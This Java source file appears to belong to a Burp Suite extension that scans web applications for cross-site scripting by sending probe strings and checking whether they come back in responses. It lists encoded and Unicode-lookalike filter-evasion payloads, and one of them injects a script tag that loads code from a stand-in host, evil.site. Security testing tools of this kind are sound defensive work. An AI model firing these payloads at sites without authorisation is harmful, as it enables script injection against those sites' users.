/*
 * Copyright (C) 2013 DobinRutishauser@broken.ch
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package attacks;

import attacks.model.AttackI;
import attacks.model.AttackData;
import gui.networking.AttackWorkEntry;
import model.ResponseHighlight;
import java.awt.Color;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.LinkedList;
import java.util.List;

import model.SentinelHttpMessageAtk;
import model.XssIndicator;
import util.BurpCallbacks;
import util.ConnectionTimeoutException;

import static attacks.model.AttackData.AttackResultType.VULNSURE;

/**
 *
 * @author unreal
 */
public class AttackXss extends AttackI {
    // Static:
    private LinkedList<AttackData> attackData = new LinkedList<AttackData>();
    private static final String atkName = "XSS";
    
    // Changes per iteration:
    private int state = -1;
    private final AttackXssAnalyzer analyzer;
    
    
    public AttackXss(AttackWorkEntry work) {
        super(work);
        analyzer = new AttackXssAnalyzer();

        String indicator = XssIndicator.getInstance().getIndicator();
        /*
         1  <p>"
         2  %3Cp%3E%22
           
         3  <p "=>
         4  %3Cp%20%22%3D%3E
          
         5  ' =                 t
         6  %27%20%3D           t
           
         7  " =                 t
         8  %20%22%3D           t
          
         9  %5C%5C%27%5C%5C%22_\'\"
        10  _\u0022a_æ_\u00e6
        11  %253Ca%2527%2522%253E
        */
        attackData.addAll(generateAttackData(indicator));
    }

    public static List<AttackData> generateAttackData(String indicator) {
        int index = 0;
        List<AttackData> attackData = new LinkedList<AttackData>();
        attackData.add(new AttackData(index++, indicator, indicator, AttackData.AttackResultType.STATUSGOOD));
        attackData.add(new AttackData(index++, indicator + "<p>\"", indicator + "<p>\"", VULNSURE));
        attackData.add(new AttackData(index++, indicator + "%3Cp%3E%22", indicator + "<p>\"", VULNSURE));
        attackData.add(new AttackData(index++, indicator + "<p \"=>", indicator + "<p \"=>", VULNSURE));
        attackData.add(new AttackData(index++, indicator + "%3Cp%20%22%3D%3E", indicator + "<p \"=>", VULNSURE));
        attackData.add(new AttackData(index++, indicator + "' =", indicator + "' =", VULNSURE));
        attackData.add(new AttackData(index++, indicator + "%27%20%3D", indicator + "' =", VULNSURE));
        attackData.add(new AttackData(index++, indicator + "\" =", indicator + "\" =", VULNSURE));
        attackData.add(new AttackData(index++, indicator + "%22%20%3D", indicator + "\" =", VULNSURE));
        attackData.add(new AttackData(index++, indicator + "%5C%27%5C%22_\\'\\\"", indicator + "", VULNSURE));
        attackData.add(new AttackData(index++, indicator + "_\\u0022_æ_\\u00E6_", indicator + "", VULNSURE));
        attackData.add(new AttackData(index++, indicator + "%253Cp%2527%2522%253E", indicator + "<p'\">", VULNSURE));
        attackData.add(new AttackData(index++, "＜" + indicator + ">","<" + indicator, VULNSURE));
        attackData.add(new AttackData(index++, "<" + indicator + "＞", indicator + ">", VULNSURE));
        attackData.add(new AttackData(index++, "=[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕"+indicator,"<script/src=//evil.site/poc.js>"+indicator, VULNSURE));
        attackData.add(new AttackData(index++, "<" + indicator + "﹥", indicator + ">", VULNSURE));
        attackData.add(new AttackData(index++, "﹤" + indicator + ">","<" + indicator, VULNSURE));
        attackData.add(new AttackData(index++, "≮" + indicator + ">","<" + indicator, VULNSURE));
        attackData.add(new AttackData(index++, "<" + indicator + "≯", indicator + ">", VULNSURE));
        attackData.add(new AttackData(index++, "℀" + indicator, "a/c" + indicator, VULNSURE));

        attackData.add(new AttackData(index++, "⁈" + indicator, "?!" + indicator, VULNSURE));
        attackData.add(new AttackData(index++, "：" + indicator, ":" + indicator, VULNSURE));
        attackData.add(new AttackData(index++, " ／" + indicator, "/" + indicator, VULNSURE));
        attackData.add(new AttackData(index++, "⒈" + indicator, "1." + indicator, VULNSURE));
        attackData.add(new AttackData(index++, "＃" + indicator, "#" + indicator, VULNSURE));
        attackData.add(new AttackData(index++, "＠" + indicator, "@" + indicator, VULNSURE));
        attackData.add(new AttackData(index++, "@" + indicator, "@" + indicator, VULNSURE));

        return new LinkedList<AttackData>(new LinkedHashSet<>(attackData));
    }

    @Override
    protected String getAtkName() {
        return "XSS";
    }
    
    @Override
    protected int getState() {
        return state;
    }
    

    @Override
    public boolean performNextAttack() {
        boolean doContinue = true;
        AttackData data;
        SentinelHttpMessageAtk httpMessage;
        
        if (state == -1) {
            data = new AttackData(-1, "", "", AttackData.AttackResultType.INFO);
        } else {
            data = attackData.get(state);
        }
        
        try {
            httpMessage = attack(data, false);
            if (httpMessage == null) {
                BurpCallbacks.getInstance().print("performNextAttack: httpmsg is null");
                return false;
            }
            analyzeResponse(data, httpMessage);
        } catch (ConnectionTimeoutException ex) {
            BurpCallbacks.getInstance().print("Connection timeout: " + ex.getLocalizedMessage());
            state++;
            return false;
        } catch (UnsupportedEncodingException e) {
            BurpCallbacks.getInstance().print("Encoding error: " + e.getLocalizedMessage());
        }


        if (state >= attackData.size() - 1) {
            doContinue = false;
        }
 
        state++;
        return doContinue;
    }
    
    
    private void analyzeResponse(AttackData data, SentinelHttpMessageAtk httpMessage) {
        // Highlight indicator anyway
        String indicator = XssIndicator.getInstance().getBaseIndicator();
        if (! indicator.equals(data.getOutput())) {
            ResponseHighlight h = new ResponseHighlight(indicator, Color.green);
            httpMessage.getRes().addHighlight(h);
        }
        
        if (state == -1) {
            analyzeOriginalRequest(httpMessage);
        } else if (state == 0) {
            analyzer.analyzeInitialResponse(data, httpMessage);
        } else if (state == 1 || state == 2 || state == 3 || state == 4) {
            analyzer.analyzeAttackResponseNonTag(data, httpMessage);
        } else if (state == 5 || state == 6 || state == 7 || state == 8) {
            analyzer.analyzeAttackResponseTag(data, httpMessage);
        } else {
            analyzer.analyzeAttackResponseTag(data, httpMessage);
        }
    }
    
       
    @Override
    public boolean init() {
        return true;
    }
}
